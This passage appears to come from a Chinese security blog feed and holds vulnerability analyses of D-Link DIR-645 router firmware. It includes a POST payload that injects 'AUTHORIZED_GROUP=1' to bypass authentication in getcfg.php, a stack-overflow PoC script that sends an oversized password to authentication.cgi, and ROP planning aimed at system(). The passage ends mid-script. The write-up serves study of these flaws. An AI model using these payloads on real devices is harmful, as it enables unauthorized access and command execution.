&#123;<span class="string">"Cookie"</span>:<span class="string">"password="</span>+payload&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>R7WebsSecurityHandler怎么传参的？</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只有一处调用，o而非p，</span></span><br><span class="line">Up	o	initWebs+1A8	LDR             R3, [R4,R3]; R7WebsSecurityHandler</span><br><span class="line">websUrlHandlerDefine(&amp;null, 0, 0, R7WebsSecurityHandler, 1);</span><br><span class="line"><span class="comment"># 怎么传参的？源码中也没找到，goahead怎么处理的？</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://www.anquanke.com/post/id/204326" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204326</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>D-Link-信息读取漏洞分析</title>
    <url>/2020/05/21/iot/D-Link-%E4%BF%A1%E6%81%AF%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="D-Link-信息读取漏洞分析"><a href="#D-Link-信息读取漏洞分析" class="headerlink" title="D-Link-信息读取漏洞分析"></a>D-Link-信息读取漏洞分析</h2><ul>
<li>固件：<a href="http://legacyfiles.us.dlink.com/DIR-645/REVA/FIRMWARE/DIR-645_FIRMWARE_1.03.ZIP" target="_blank" rel="noopener">http://legacyfiles.us.dlink.com/DIR-645/REVA/FIRMWARE/DIR-645_FIRMWARE_1.03.ZIP</a></li>
<li>请求php文件，对应的phpcgi二进程程序（asp就是sapcgi？</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /usr/sbin下只有一个，其余都是htdocs目录下</span></span><br><span class="line">/squashfs-root$ find . -name <span class="string">"*cgi*"</span> | xargs ls -l</span><br><span class="line">lrwxrwxrwx 1 lxl lxl     14 Mar 17 10:50 ./usr/sbin/phpcgi -&gt; /htdocs/cgibin</span><br></pre></td></tr></table></figure>
<ul>
<li>sobj_xxx系列函数，源码：<a href="https://github.com/patrick-ken/MyNet_N900/blob/master/elbox_WRGND15/comlib/strobj.c" target="_blank" rel="noopener">https://github.com/patrick-ken/MyNet_N900/blob/master/elbox_WRGND15/comlib/strobj.c</a></li>
<li><p>xmldb client的源码：<a href="https://github.com/coolshou/DIR-850L_A1/blob/master/comlib/libxmldbc.c" target="_blank" rel="noopener">https://github.com/coolshou/DIR-850L_A1/blob/master/comlib/libxmldbc.c</a></p>
</li>
<li><p>PostKeyValue/GetKeyValue是怎么调用的？//here</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原文</span></span><br><span class="line">该函数首先会判断传入的url中是否存在问号来判断请求方式，如果存在问号则直接将调用相应的函数处理方式GetKeyValue或PostKeyValue（感觉这样的判断是有问题的）。</span><br><span class="line"><span class="comment"># 并非函数调用，函数指针赋值罢了 </span></span><br><span class="line">v23 = func_ptr;</span><br><span class="line">move    <span class="variable">$s6</span>, <span class="variable">$a0</span>         <span class="comment"># 参数1，func_ptr</span></span><br><span class="line">sw      <span class="variable">$s6</span>, 0x30+func_ptr(<span class="variable">$sp</span>)<span class="comment"># 汇编中确实是赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原文</span></span><br><span class="line">如果为post则通过比对CONTENT_TYPE来找到相应的类型处理函数进行判断，并最终调用PostKeyValue。</span><br><span class="line"> <span class="comment"># 最终调用的是handle_application_type等函数</span></span><br><span class="line"><span class="built_in">return</span> (struc_1_arr[index - 1].func)(func_ptr, args_str_obj, content_length_1, &amp;content_type[func]);</span><br><span class="line">.data.rel.ro:00433014 struc_1_arr:    struc_1 &lt;aApplication, 0xC, handle_application_type&gt;<span class="comment"># 结构体数组</span></span><br><span class="line"><span class="comment"># 这些函数确实是4参数，第一个参数是func_ptr，但并没有调用</span></span><br><span class="line">v19 = a1<span class="comment">#仅仅赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件系统中也没有（可能不是这个名</span></span><br><span class="line">Searching 1931 files <span class="keyword">for</span> <span class="string">"PostKeyValue"</span> (regex)</span><br><span class="line">0 matches</span><br></pre></td></tr></table></figure>
<ul>
<li>mips指令</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mult	$t3,$t4	</span></span><br><span class="line"><span class="comment"># 运算结果存储在hi,lo（hi高位数据， lo地位数据）</span></span><br><span class="line">multiply 32-bit quantities <span class="keyword">in</span> <span class="variable">$t3</span> and <span class="variable">$t4</span>, and store 64-bit</span><br><span class="line">result <span class="keyword">in</span> special registers Lo and Hi:  (Hi,Lo) = <span class="variable">$t3</span> * <span class="variable">$t4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># div	$t5,$t6	</span></span><br><span class="line"><span class="comment"># 商数存放在 lo, 余数存放在 hi</span></span><br><span class="line">Lo = <span class="variable">$t5</span> / <span class="variable">$t6</span>   (<span class="built_in">integer</span> quotient)</span><br><span class="line">Hi = <span class="variable">$t5</span> mod <span class="variable">$t6</span>   (remainder)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mfhi	$t0、</span></span><br><span class="line"><span class="comment"># mflo	$t1	</span></span><br><span class="line"><span class="comment"># 不能直接获取 hi 或 lo中的值， 需要mfhi, mflo指令传值给寄存器</span></span><br><span class="line">move quantity <span class="keyword">in</span> special register Hi to <span class="variable">$t0</span>:   <span class="variable">$t0</span> = Hi</span><br><span class="line">move quantity <span class="keyword">in</span> special register Lo to <span class="variable">$t1</span>:   <span class="variable">$t1</span> = Lo</span><br><span class="line">used to get at result of product or quotient</span><br></pre></td></tr></table></figure>
<ul>
<li>模拟启动时参数说明</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// echo "$INPUT"  | chroot .  ./qemu  -0 "/phpcgi" -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded"  -E REQUEST_METHOD="POST"  -E REQUEST_URI="/getcfg.php" -E REMOTE_ADDR="127.0.0.1" -g $PORT ./htdocs/cgibin "/phpcgi" "/phpcgi"#2&gt;/dev/null</span></span><br><span class="line">脚本中需要说明的两点是使用<span class="number">-0</span>指定第一次参数为/phpcgi，因为cgibin中判断cgi名称的为第一个参数，</span><br><span class="line">  其次是CONTENT_TYPE为application/x-www-form-urlencoded，因为它在处理post参数时有比对CONTENT_TYPE，不同的type有不同的处理函数，使用application/x-www-form-urlencoded会方便一些。</span><br><span class="line"></span><br><span class="line"><span class="comment">// -0 "/phpcgi"</span></span><br><span class="line"><span class="comment">// -0 argv0             QEMU_ARGV0        forces target process argv[0] to be 'argv0'</span></span><br><span class="line"><span class="comment">// qemu运行的是/htdocs/cgibin，其应该是[0]，-0强制指定</span></span><br><span class="line"><span class="comment">// 此强制应该仅限制于main中，即第一次传播时，phpcgi_main中argv + 4才为phpcgi，[0]应该还是cgibin</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v3 = *argv;</span><br><span class="line">  v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">'/'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    v3 = v6 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"phpcgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = phpcgi_main;                           <span class="comment">// 处理php请求</span></span><br><span class="line">    argc_1 = argc;</span><br><span class="line">    <span class="keyword">return</span> (v8)(argc_1, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// CONTENT_TYPE="application/x-www-form-urlencoded"</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">cgibin_parse_request</span><span class="params">(<span class="keyword">int</span> func_ptr, <span class="keyword">int</span> args_str_obj, <span class="keyword">unsigned</span> <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        content_type = getenv(<span class="string">"CONTENT_TYPE"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( content_type )</span><br><span class="line">        &#123;</span><br><span class="line">          ptr_arr = struc_1_arr;                <span class="comment">// 结构体数组</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )                           <span class="comment">// 遍历结构体数组</span></span><br><span class="line">          &#123;</span><br><span class="line">            type = ptr_arr-&gt;type;</span><br><span class="line">            <span class="keyword">if</span> ( !ptr_arr-&gt;type )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            func_len = ptr_arr-&gt;func_len;</span><br><span class="line">            ++ptr_arr;</span><br><span class="line">            ++index;</span><br><span class="line">            <span class="keyword">if</span> ( !strncasecmp(content_type, type, func_len) )<span class="comment">// 遍历，直到找到对应的type，随后调用相关函数</span></span><br><span class="line">              <span class="keyword">return</span> (struc_1_arr[index - <span class="number">1</span>].func)(func_ptr, args_str_obj, content_length_1, &amp;content_type[func_len]);</span><br><span class="line"><span class="comment">// 调用 handle_application_type</span></span><br><span class="line">.data.rel.ro:<span class="number">00433014</span> struc_1_arr:    struc_1 &lt;aApplication, <span class="number">0xC</span>, handle_application_type&gt;</span><br><span class="line"><span class="comment">// 匹配type中/后的字符串</span></span><br><span class="line">  <span class="keyword">int</span> __<span class="function">fastcall <span class="title">handle_application_type</span><span class="params">(<span class="keyword">int</span> func_ptr, <span class="keyword">int</span> args_str_obj, <span class="keyword">unsigned</span> <span class="keyword">int</span> content_length, <span class="keyword">const</span> <span class="keyword">char</span> *content_type_endPos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !strncasecmp(content_type_endPos, <span class="string">"x-www-form-urlencoded"</span>, <span class="number">0x15</span>u) )</span><br><span class="line">  &#123;</span><br></pre></td></tr></table></figure>
<ul>
<li>PostKeyValue的参数2是结构体</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 新建结构体</span></span><br><span class="line"><span class="number">00000000</span> struc_post_data struc  # (<span class="keyword">sizeof</span>=<span class="number">0xC</span>, mappedto_12)</span><br><span class="line"><span class="number">00000000</span> type:           .word ?</span><br><span class="line"><span class="number">00000004</span> key:            .word ?</span><br><span class="line"><span class="number">00000008</span> value:          .word ?</span><br><span class="line"><span class="number">0000000</span>C struc_post_data ends</span><br></pre></td></tr></table></figure>
<ul>
<li>漏洞成因梳理</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 启动时参数</span></span><br><span class="line">./qemu  </span><br><span class="line"><span class="number">-0</span> <span class="string">"/phpcgi"</span> <span class="comment">// 强制设置argv[0]，应该仅限于main函数，即第一次传播时，见上“模拟启动时参数说明”</span></span><br><span class="line">-E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=<span class="string">"application/x-www-form-urlencoded"</span>  -E REQUEST_METHOD=<span class="string">"POST"</span>  -E REQUEST_URI=<span class="string">"/getcfg.php"</span> -E REMOTE_ADDR=<span class="string">"127.0.0.1"</span> <span class="comment">// 环境变量</span></span><br><span class="line">-g $PORT</span><br><span class="line">./htdocs/cgibin <span class="string">"/phpcgi"</span> <span class="string">"/phpcgi"</span>#<span class="number">2</span>&gt;/dev/null <span class="comment">// 真正的参数，依次[0][1][2],-0是强制设置的</span></span><br><span class="line"><span class="comment">// post数据</span></span><br><span class="line">INPUT=`python -c <span class="string">"print 'SERVICES=DEVICE.ACCOUNT&amp;attack=ture\nAUTHORIZED_GROUP=1'"</span>`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// phpcgi_main中，运行至cgibin_parse_request前</span></span><br><span class="line"><span class="string">"/phpcgi\n_SERVER_REMOTE_ADDR=127.0.0.1\n_SERVER_REQUEST_URI=/getcfg.php\n_SERVER_REQUEST_METHOD=POST\n_SERVER_CONTENT_TYPE=application/x-www-form-urlencoded\n_SERVER_CONTENT_LENGTH=55\n_SERVER__=/usr/sbin/c"</span>...</span><br><span class="line"><span class="comment">// /phpcgi</span></span><br><span class="line"><span class="keyword">int</span> __fastcall phpcgi_main(<span class="keyword">int</span> argc, <span class="keyword">int</span> argv, _DWORD *envp)</span><br><span class="line">&#123;</span><br><span class="line">	sobj_add_string(str_obj, *(argv + <span class="number">4</span>));</span><br><span class="line">	sobj_add_char(str_obj_1, <span class="string">'\n'</span>);</span><br><span class="line"><span class="comment">// 各种环境变量</span></span><br><span class="line"><span class="keyword">for</span> ( i = envp; *i; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  sobj_add_string(str_obj_1, <span class="string">"_SERVER_"</span>);</span><br><span class="line">  sobj_add_string(str_obj_1, *i);</span><br><span class="line">  sobj_add_char(str_obj_1, <span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// _SERVER__=</span></span><br><span class="line">_(下划线)：上一条命令的最后一个参数，默认都有的，与本例无关</span><br><span class="line"></span><br><span class="line"><span class="comment">// -E REQUEST_METHOD="POST"，post请求</span></span><br><span class="line"><span class="comment">// cgibin_parse_request应该是执行了PostKeyValue（具体怎么执行的未知？</span></span><br><span class="line">  request_method = getenv(<span class="string">"REQUEST_METHOD"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(request_method_1, <span class="string">"POST"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  func_ptr = PostKeyValue;</span><br><span class="line">  ret_code = cgibin_parse_request(func_ptr, str_obj_1, <span class="number">0x80000</span>u);</span><br><span class="line"></span><br><span class="line"><span class="comment">// PostKeyValue解析post数据</span></span><br><span class="line"><span class="comment">// post数据是以&amp;为分割、解析后以\n为分割</span></span><br><span class="line"><span class="comment">// 解析后："_POST_SERVICES=DEVICE.ACCOUNT\n_POST_attack=ture\nAUTHORIZED_GROUP=1\n\n"</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">PostKeyValue</span><span class="params">(<span class="keyword">int</span> str_obj, struc_post_data *post_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( post_data-&gt;type )                        <span class="comment">// 第一个成员表类型，非0才是post</span></span><br><span class="line">  &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sobj_add_string(str_obj, <span class="string">"_POST_"</span>);         <span class="comment">// key的前缀，表明type</span></span><br><span class="line">    key = sobj_get_string(post_data-&gt;key);      <span class="comment">// //第二个成员为key</span></span><br><span class="line">    sobj_add_string(str_obj, key);              <span class="comment">// =前，应该是key</span></span><br><span class="line">    sobj_add_char(str_obj, <span class="string">'='</span>);                <span class="comment">// a1为字符串对象</span></span><br><span class="line">    value = post_data-&gt;value;</span><br><span class="line">  &#125;</span><br><span class="line">  value_str = sobj_get_string(value);           <span class="comment">// 第三个成员为value</span></span><br><span class="line">LABEL_11:</span><br><span class="line">  sobj_add_string(str_obj, value_str);          <span class="comment">// =后，应该是value</span></span><br><span class="line">  <span class="keyword">return</span> sobj_add_char(str_obj, <span class="string">'\n'</span>);          <span class="comment">// 每对键值对后面添加换行符作为分割</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// cgibin_parse_request后，即PostKeyValue后，需要进行验证，还要对str_obj处理</span></span><br><span class="line">ret_code = cgibin_parse_request(func_ptr, str_obj_1, <span class="number">0x80000</span>u);<span class="comment">// 传入函数及参数字符串，进一步处理请求</span></span><br><span class="line"><span class="keyword">if</span> ( ret_code &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  group_id = sess_validate();                 <span class="comment">// 验证session</span></span><br><span class="line">                                              <span class="comment">// call sess_get_uid，未认证，故返回-1</span></span><br><span class="line">  <span class="built_in">sprintf</span>(v16, <span class="string">"AUTHORIZED_GROUP=%d"</span>, group_id);<span class="comment">// php中没找到，这里就是产生AUTHORIZED_GROUP的地方</span></span><br><span class="line">  sobj_add_string(str_obj_1, v16);</span><br><span class="line">  sobj_add_char(str_obj_1, <span class="string">'\n'</span>);</span><br><span class="line">  sobj_add_string(str_obj_1, <span class="string">"SESSION_UID="</span>);</span><br><span class="line">  sess_get_uid(str_obj_1);</span><br><span class="line">  sobj_add_char(str_obj_1, <span class="string">'\n'</span>);</span><br><span class="line">  arg_string = sobj_get_string(str_obj_1);</span><br><span class="line">  ret_code = xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, arg_string, <span class="built_in">stdout</span>);<span class="comment">// 通过socket进程通信，将执行权交由php文件</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 处理后新添了  AUTHORIZED_GROUP=-1\nSESSION_UID=\n</span></span><br><span class="line"><span class="string">"_POST_SERVICES=DEVICE.ACCOUNT\n_POST_attack=ture\nAUTHORIZED_GROUP=1\n\nAUTHORIZED_GROUP=-1\nSESSION_UID=\n"</span></span><br><span class="line"><span class="comment">// php中验证，AUTHORIZED_GROUP=1是手动构造的，AUTHORIZED_GROUP=-1是验证的结果，前者有效，故绕过</span></span><br><span class="line"><span class="function">function <span class="title">is_power_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GLOBALS[<span class="string">"AUTHORIZED_GROUP"</span>] == <span class="string">""</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($_GLOBALS[<span class="string">"AUTHORIZED_GROUP"</span>] &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://ray-cp.github.io/archivers/d-link-getcfg_php-info-leak" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/d-link-getcfg_php-info-leak</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>D-Link-DIR-645路由器栈溢出漏洞分析</title>
    <url>/2020/05/02/iot/D-Link-DIR-645%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="01-漏洞描述"><a href="#01-漏洞描述" class="headerlink" title="01-漏洞描述"></a>01-漏洞描述</h1><ul>
<li><p><a href="https://www.exploit-db.com/exploits/33862" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/33862</a></p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This module exploits an remote buffer overflow vulnerability on several D-Link routers.</span><br><span class="line">The vulnerability exists in the handling of HTTP queries to the authentication.cgi with long password values. The vulnerability can be exploitable without authentication. </span><br><span class="line">This module has been tested successfully on D-Link firmware DIR645A1_FW103B11. Other firmwares such as the DIR865LA1_FW101b06 and DIR845LA1_FW100b20 are also vulnerable.</span><br></pre></td></tr></table></figure>
</li>
<li><p>关键点：溢出漏洞、http请求、password字段、authentication.cgi<a id="more"></a></p>
</li>
</ul>
<h1 id="02-环境-工具"><a href="#02-环境-工具" class="headerlink" title="02-环境/工具"></a>02-环境/工具</h1><ul>
<li>Ubuntu 18.04：目标系统，运行路由器固件</li>
<li>Windows 7 专业版：运行IDA作为远程调试机</li>
<li>IDA Pro：静态分析、远程动态调试</li>
<li>mips rop finder插件：搜索可用rop</li>
<li>binwalk：提取固件中的文件系统</li>
<li>firmadyne工具包：模拟路由器执行</li>
<li>固件下载：<code>ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP</code></li>
<li>《路由器0Day漏洞》一书中脚本：run_cgi.sh（poc）、patterLocOffset.py（确定偏移）、DIR645-f-V1.03.py（exp）</li>
</ul>
<h1 id="03-漏洞分析"><a href="#03-漏洞分析" class="headerlink" title="03-漏洞分析"></a>03-漏洞分析</h1><ol>
<li><p>用binwalk将固件中的文件系统提取出来，cd到squashfs目录，寻找存在漏洞的目标文件authentication.cgi，得知其是一个符号链接，真正的目标文件是cgibin</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031907.jpg" alt="image-20200501210401531"></p>
</li>
<li><p>利用已有的poc来定位漏洞，使用的sh脚本如下，来自《路由器0Day漏洞》一书中run_cgi.sh</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 待执行命令</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo ./run_cgi.sh `python -c <span class="string">"print 'uid=A21G&amp;password='+'A'*1160"</span>` <span class="string">"uid=A21G"</span></span></span><br><span class="line"></span><br><span class="line">INPUT="$1" # 参数1，uid=A21G&amp;password=1160个A</span><br><span class="line">TEST="$2"	# 参数2，uid=A21G</span><br><span class="line">LEN=$(echo -n "$INPUT" | wc -c)	# 参数1的长度</span><br><span class="line">PORT="1234"	# 监听的调试端口</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 用法错误则提示</span></span><br><span class="line">if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]</span><br><span class="line">then</span><br><span class="line">	echo -e "\nUsage: sudo $0 \n"</span><br><span class="line">	exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制qemu-mipsel-static到本目录并重命名，注意是static版本</span></span><br><span class="line">cp $(which qemu-mipsel-static) ./qemu</span><br><span class="line">echo $TEST</span><br><span class="line"><span class="meta">#</span><span class="bash"> ｜ 管道符：前者输出作为后者输入</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chroot 将某目录设置为根目录（逻辑上的）</span></span><br><span class="line">echo "$INPUT" | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E REQUEST_URI="/authentication.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /htdocs/web/authentication.cgi</span><br><span class="line">echo 'run ok'</span><br><span class="line">rm -f ./qemu	# 删除拷贝过来的执行文件</span><br></pre></td></tr></table></figure>
</li>
<li><p>书中原有的poc运行失败</p>
<ul>
<li>去掉<code>2&gt;/dev/null</code>，使其显示报错信息（2-标准报错信息</li>
<li><code>chroot: failed to run command ‘./qemu’: No such file or directory</code></li>
<li><a href="https://blog.csdn.net/xieqianhua55/article/details/50749489" target="_blank" rel="noopener">https://blog.csdn.net/xieqianhua55/article/details/50749489</a></li>
<li>apt安装qemu-user-static，将cp中qemu-mipsel改为qemu-mipsel-static</li>
<li>应该是因为chroot后，路径都变了，qemu的执行缺少依赖，改为静态即可</li>
</ul>
</li>
<li><p>Ubuntu中执行脚本，开启调试端口1234，等待远程调试机连接</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">sudo ./run_cgi.sh `python -c <span class="string">"print 'uid=A21G&amp;password='+'A'*1160"</span>` <span class="string">"uid=A21G"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Windows 7 中IDA打开cgibin，开启远程调试</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031914.jpg" alt="image-20200501213519103"></p>
</li>
<li><p>因为漏洞文件与认证有关，故function子窗口中搜索“authentication“，试一下authenticatecgi_main函数，F2下断，F9运行至此</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031916.jpg" alt="image-20200501215521391"></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031903.jpg" alt="image-20200501215835668"></p>
</li>
<li><p>地址0040B028处，保存ra寄存器中的返回地址到内存</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-31909.jpg" alt="image-20200501220555022"></p>
</li>
<li><p>F8单步，看什么时候内存中的返回地址被修改，来缩小范围，定位漏洞点；</p>
</li>
<li><p>执行read函数后，返回地址被覆盖，因此，可初步判定read为溢出点</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031913.jpg" alt="image-20200501222014031"></p>
</li>
<li><p>getenv函数获取http请求中CONTENT_LENGTH字段的值，即内容长度；</p>
<p>随后atoi函数将字符串形式的长度值转为整型；</p>
<p>read函数没有验证参数nbytes大小，将用户可控的输入内容放置大小固定的栈中局部变量，从而发生溢出！</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031905.jpg" alt="image-20200430105301118"></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-31915.jpg" alt="image-20200430105615046"></p>
</li>
</ol>
<h1 id="04-漏洞利用"><a href="#04-漏洞利用" class="headerlink" title="04-漏洞利用"></a>04-漏洞利用</h1><h2 id="4-1-选择攻击途径"><a href="#4-1-选择攻击途径" class="headerlink" title="4.1-选择攻击途径"></a>4.1-选择攻击途径</h2><ol>
<li><p>选择命令执行为该漏洞的攻击途径（除了利用system等函数来命令执行的方式，还有直接执行shellcode的方式）</p>
</li>
<li><p>目标文件cgibin会加载libc.so.0动态库，因此IDA中打开，在function子窗口中键入“system”，查得so动态库中system函数的地址为00053200</p>
<p> 注意：由于so文件是动态库，因此00053200只是一个相对偏移，加上libc.so.0动态库的加载基址0x2aaf8000才是最终的绝对地址，即2ab4b200</p>
<p> （疑问🤔️：加载基址是怎么知道的？</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031906.jpg" alt="image-20200430155508963"></p>
</li>
<li><p>光有函数的地址还不够，还要再找能够调用函数的指令。使用mips rop finder插件来寻找可用的gadgets序列</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031909.jpg" alt="image-20200430170533344"></p>
</li>
<li><p>如上所示：jalr $t9会调用t9寄存器中的地址，而t9又来自s0，因此，只要将函数地址放置s0寄存器，便可以实现函数的调用；</p>
<p> 待调用函数的参数a0，其来自s5，又来自于sp,0x170+var_160=sp+10</p>
<p> 因此，将system函数地址放置s0，将待执行的命令放置sp+10，就可以实现任意命令的执行</p>
</li>
</ol>
<h2 id="4-2-确定偏移"><a href="#4-2-确定偏移" class="headerlink" title="4.2-确定偏移"></a>4.2-确定偏移</h2><ol>
<li><p>patterLocOffset.py，生成大量有序字符，确定偏移以实现精准定位</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line"><span class="comment">## Create pattern strings &amp; location offset </span></span><br><span class="line"><span class="comment">## Tested against Ubuntu 12.04 &amp; Windows # #</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">## Example:</span></span><br><span class="line"><span class="comment">## C:\Users\Lenov\Desktop&gt; patterLocOffset.py -c -l 260 -f output.txt</span></span><br><span class="line"><span class="comment">### [*] Create pattern string contains 260 characters ok!</span></span><br><span class="line"><span class="comment">### [+] output to output.txt ok!</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">## C:\Users\Lenov\Desktop&gt; patternLocOffset.py -s 0x41613141 -l 260</span></span><br><span class="line"><span class="comment">### [*] Create pattern string contains 260 characters ok!</span></span><br><span class="line"><span class="comment">### [*] Exact match at offset 3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Nimdakey # 09-10-2013</span></span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">a = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">b = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">c = <span class="string">"0123456789"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(count,output)</span>:</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># pattern create</span></span><br><span class="line">    codeStr = <span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] Create pattern string contains %d characters'</span>%count,</span><br><span class="line">    timeStart = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,count):</span><br><span class="line">        codeStr += a[i/(<span 